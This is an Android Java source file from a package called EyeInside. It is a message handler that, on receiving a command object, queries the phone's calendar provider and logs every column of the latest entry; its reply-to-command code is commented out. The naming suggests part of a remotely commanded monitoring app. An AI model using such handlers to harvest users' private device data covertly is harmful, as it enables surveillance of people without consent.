package com.code4bones.EyeInside;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

import com.code4bones.utils.NetLog;

final class handleAny extends Handler {

	private Context mContext;
	
	public handleAny(Context context,Uri uri) {
		mContext = context;
	}
	
	public static final Uri URI = Uri.parse("content://com.android.calendar/");    

	public void handleMessage(Message msg) {
		
	   NetLog.v("handleAny !");	
		
	   CommandObj cmd = (CommandObj) msg.obj;
	   Cursor cur = mContext.getContentResolver().query(URI, null,null, null, "_id DESC");
       if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("handleAny Cursor null");
    	   return;
       }
       
       for ( String col : cur.getColumnNames() ) {
    	   NetLog.v("%s : %s",col,cur.getString(cur.getColumnIndex(col)));
       }
		
		try {
				//cmd.Reply(cur);
				cur.close();
			} catch (Exception e) {
				NetLog.v("handleSmsLog error: %s",e.getMessage());
				//cmd.replySMS("E: %s -> %s", cmd.commandName,e.getMessage());
		}
	} // handleMessage
}
